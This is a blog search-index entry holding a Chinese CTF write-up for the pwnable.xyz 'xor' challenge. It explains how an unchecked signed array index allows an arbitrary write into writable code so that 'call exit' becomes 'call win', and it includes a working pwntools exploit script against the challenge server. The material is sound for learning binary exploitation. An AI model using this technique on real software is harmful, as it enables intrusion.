@@ -1920,4 +1920,44 @@ Linux 32位的系统调用时通过int 80h来实现的，<strong>eax寄存器中
         <tag>PWN</tag>
       </tags>
   </entry>
+  <entry>
+    <title>xor</title>
+    <url>/xiaohong404.github.io/2020/11/16/PWN/Pwnable_xyz/xor/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/11/16/PWN/Pwnable_xyz/xor/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/11/16/PWN/Pwnable_xyz/xor/8.png" class></strong></p>
+<h3 id="检查文件保护措施"><a href="#检查文件保护措施" class="headerlink" title="检查文件保护措施"></a>检查文件保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/11/16/PWN/Pwnable_xyz/xor/1.png" class></strong></p>
+<h3 id="用IDA64打开文件"><a href="#用IDA64打开文件" class="headerlink" title="用IDA64打开文件"></a>用IDA64打开文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The Poopolator&quot;</span>);</span><br><span class="line">  setup(<span class="string">&quot;The Poopolator&quot;</span>, argv);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    v3 = _isoc99_scanf(<span class="string">&quot;%ld %ld %ld&quot;</span>, &amp;v4, &amp;v5, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 || !v5 || !v6 || v6 &gt; <span class="number">9</span> || v3 != <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    result[v6] = v5 ^ v4;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result: %ld\n&quot;</span>, result[v6]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数主要功能为：接收v4，v5和v6中的输入值，并输出<code>result [v6] = v5 xor v4</code>的值，每个变量都是int64（8个字节），因此也可以插入负值。因此可以向任意的地址写入任意的内容。</p>
+<p>程序同样直接提供了包装的system函数win：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/16/PWN/Pwnable_xyz/xor/2.png" class></strong></p>
+<p>查看数组result的地址，其是一个在bss段上的全局变量：<br>**<img src="/xiaohong404.github.io/2020/11/16/PWN/Pwnable_xyz/xor/4.png" class>**</p>
+<h4 id="vmmap查看程序内存"><a href="#vmmap查看程序内存" class="headerlink" title="vmmap查看程序内存"></a>vmmap查看程序内存</h4><p>vmmap显示程序执行后实际映射的内存区域</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/16/PWN/Pwnable_xyz/xor/3.png" class></strong></p>
+<p>发现从0x0000555555554000到0x0000555555555000的code段中具有0x1000字节的<code>rwx</code>权限空间。</p>
+<p>gdb在main函数处下断点：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/16/PWN/Pwnable_xyz/xor/5.png" class></strong></p>
+<p>可见main函数等代码段的区域即上述具有rwx权限的段。</p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>因此，接下来的思路就是利用result数组向该程序段中写入shellcode执行即可，由于已经给出了win函数的地址，因此就不用自己编写shellcode，直接调用win函数则可以拿到flag。因此，可将程序中的<code>call exit</code>指令修改为<code>call win</code>。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/11/16/PWN/Pwnable_xyz/xor/6.png" class></strong></p>
+<p>注意到result是一个每个元素为8字节的数组，因此若要使得<code>result[v6] = v5 ^ v4</code>，则<code>result数组基地址 + 8*v6 = v5 ^ v4 = call win = call 0xa21(win函数地址)</code>。而<code>0x202200(result数组基地址) + 8*v6 = call exit指令地址 = 0xac8</code>，这里的地址不是程序实际运行中的地址，但是偏移量相同。</p>
+<p>另外，注意v5、v4的取值不能为0，最简单可令其中1。</p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./xor&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;svc.pwnable.xyz&#x27;</span>, <span class="number">30029</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./xor&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exit = <span class="number">0xac8</span></span><br><span class="line"></span><br><span class="line">e.asm(exit, <span class="string">&quot;call 0xa21&quot;</span>) <span class="comment"># call win</span></span><br><span class="line">result = e.read(exit, <span class="number">5</span>)</span><br><span class="line">result = int.from_bytes(result, <span class="string">&#x27;little&#x27;</span>) <span class="comment"># little endian</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&quot;1 &quot;</span></span><br><span class="line">payload += str(result ^ <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">payload += str((exit - <span class="number">0x202200</span>) / <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;  &#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># get flag</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://docs.pwntools.com/en/stable/elf/elf.html">asm()函数</a></p>
+<p>read函数读取5个字节应当是call指令编译的字节数，为啥是5？可参考：</p>
+<p><a href="https://bbs.csdn.net/topics/320223705">https://bbs.csdn.net/topics/320223705</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/68588184">https://zhuanlan.zhihu.com/p/68588184</a></p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/11/16/PWN/Pwnable_xyz/xor/7.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.xyz</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
 </search>
